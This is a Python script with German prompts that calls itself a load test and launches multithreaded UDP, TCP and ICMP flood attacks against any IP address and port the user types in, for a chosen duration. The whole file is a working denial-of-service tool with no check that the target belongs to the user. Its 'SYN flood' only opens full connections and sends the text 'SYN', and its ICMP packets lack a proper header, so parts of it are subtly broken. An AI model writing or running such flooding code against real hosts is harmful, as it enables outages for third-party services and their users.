import socket
import threading
import random
import time

# Globale Variablen
packet_counter = 0
stop_event = threading.Event()

# UDP Flood
def udp_flood(ip, port, packet_size):
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(packet_size)
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (ip, port))
            packet_counter += 1
        except:
            pass

# TCP SYN Flood
def syn_flood(ip, port):
    global packet_counter
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            sock.send(b"SYN")
            packet_counter += 1
            sock.close()
        except:
            pass

# ICMP Flood
def icmp_flood(ip):
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    payload = random._urandom(1024)
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (ip, 0))
            packet_counter += 1
        except:
            pass

# Show statistics
def show_statistics():
    global packet_counter
    while not stop_event.is_set():
        print(f"Gesendete Pakete: {packet_counter}")
        time.sleep(1)

# Hauptfunktion
def main():
    global stop_event
    print("Belastungstest starten:")
    print("1 - UDP Flood\n2 - TCP SYN Flood\n3 - ICMP Flood")
    choice = input("Wähle den Testtyp: ")

    ip = input("Ziel-IP-Adresse: ")
    port = 0
    packet_size = 0

    if choice in ["1", "2"]:
        port = int(input("Ziel-Port: "))
    if choice == "1":
        packet_size = int(input("Paketgröße (Bytes): "))

    num_threads = int(input("Anzahl der Threads: "))
    duration = int(input("Dauer des Tests (Sekunden): "))

    # Start Statistikthread
    stats_thread = threading.Thread(target=show_statistics)
    stats_thread.daemon = True
    stats_thread.start()

    # Starte Test
    try:
        threads = []
        for _ in range(num_threads):
            if choice == "1":
                thread = threading.Thread(target=udp_flood, args=(ip, port, packet_size))
            elif choice == "2":
                thread = threading.Thread(target=syn_flood, args=(ip, port))
            elif choice == "3":
                thread = threading.Thread(target=icmp_flood, args=(ip,))
            else:
                print("Ungültige Auswahl.")
                return

            thread.daemon = True
            threads.append(thread)
            thread.start()

        # Warte für die Testdauer
        time.sleep(duration)
    except KeyboardInterrupt:
        print("Test abgebrochen.")
    finally:
        stop_event.set()
        for thread in threads:
            thread.join()
        print("\nTest beendet.")

if __name__ == "__main__":
    main()
